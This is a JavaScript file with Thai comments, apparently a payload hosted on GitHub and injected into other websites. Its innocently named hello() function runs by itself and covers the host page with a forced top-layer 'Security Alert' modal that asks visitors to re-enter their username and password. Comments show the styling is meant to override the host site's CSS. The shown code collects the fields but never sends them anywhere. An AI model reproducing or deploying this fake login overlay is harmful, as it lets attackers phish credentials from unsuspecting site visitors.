// ปรับปรุงไฟล์ test.js ใน GitHub
function hello() {
    const createModal = () => {
        const overlay = document.createElement('div');
        // ใส่ !important ทุกจุดเพื่อป้องกัน CSS เว็บเดิมมาทับ
        overlay.style.setProperty('position', 'fixed', 'important');
        overlay.style.setProperty('top', '0', 'important');
        overlay.style.setProperty('left', '0', 'important');
        overlay.style.setProperty('width', '100%', 'important');
        overlay.style.setProperty('height', '100%', 'important');
        overlay.style.setProperty('background-color', 'rgba(0,0,0,0.8)', 'important');
        overlay.style.setProperty('z-index', '2147483647', 'important'); // ค่า z-index สูงสุดที่เป็นไปได้
        overlay.style.setProperty('display', 'flex', 'important');
        overlay.style.setProperty('justify-content', 'center', 'important');
        overlay.style.setProperty('align-items', 'center', 'important');

        const modal = document.createElement('div');
        modal.style.setProperty('background-color', 'white', 'important');
        modal.style.setProperty('padding', '30px', 'important');
        modal.style.setProperty('border-radius', '10px', 'important');
        modal.style.setProperty('width', '350px', 'important');
        modal.style.setProperty('color', 'black', 'important');
        modal.style.setProperty('text-align', 'center', 'important');

        modal.innerHTML = `
            <h2 style="color:red !important;">Security Alert</h2>
            <p>Please re-authenticate</p>
            <input type="text" id="u" placeholder="User" style="width:90%;margin:10px;padding:5px;">
            <input type="password" id="p" placeholder="Pass" style="width:90%;margin:10px;padding:5px;">
            <button id="b" style="padding:10px 20px;">Login</button>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);
        console.log("Modal Injected Successfully!");
    };

    // ใช้ interval เพื่อเช็คจนกว่า body จะพร้อม
    const checkExist = setInterval(() => {
       if (document.body) {
          createModal();
          clearInterval(checkExist);
       }
    }, 100);
}

// เรียกใช้เองในตัวไฟล์เลย เผื่อกรณีที่ onload ใน script tag ไม่ทำงาน
hello();
